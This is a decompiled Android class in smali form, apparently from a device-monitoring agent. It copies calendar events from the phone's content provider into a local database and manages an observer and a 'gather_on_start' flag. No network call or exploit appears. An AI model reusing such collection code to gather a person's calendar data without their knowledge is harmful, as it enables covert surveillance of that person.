.class public Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;
.super Ljava/lang/Object;
.source "EventCalendarLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "EventCalendarLister"


# instance fields
.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EventCalendarData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EventCalendarData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 36
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->contentResolver:Landroid/content/ContentResolver;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->contentUri:Landroid/net/Uri;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 37
    iput-object p1, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->contentResolver:Landroid/content/ContentResolver;

    .line 38
    iput-object p2, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->contentUri:Landroid/net/Uri;

    .line 39
    iput-object p3, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 40
    iput-object p4, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 41
    iput-object p5, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    .line 42
    iput-object p6, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 43
    iput-object p7, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .line 48
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;->deactivate()Z

    .line 50
    new-instance v0, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v1, v0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/calendar/EventCalendarCallable;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 61
    :try_start_0
    invoke-interface {v0}, Ljava/util/concurrent/Callable;->call()Ljava/lang/Object;

    .line 63
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "gather_on_start"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 64
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 66
    iget-object v0, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->eventCalendarObserver:Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/calendar/EventCalendarObserver;->activate()Z
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 74
    iget-object v1, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EventCalendarLister"

    const-string v3, "Exception caught durring callable.call()."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 69
    iget-object v1, p0, Lcom/hp/vd/module/monitor/calendar/EventCalendarLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EventCalendarLister"

    const-string v3, "run(): Exception caught during executing Callable."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
